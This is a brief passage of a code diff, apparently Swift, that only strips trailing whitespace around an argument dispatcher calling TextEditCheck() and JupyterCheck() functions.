             if argument.contains("-TextEditCheck"){
                 TextEditCheck()
             }
-            
+
             if argument.contains("-JupyterCheck"){
                 JupyterCheck()
             }
-            
-            
-            
-            
+
+
+
+
         }
-        
+
     }
 }
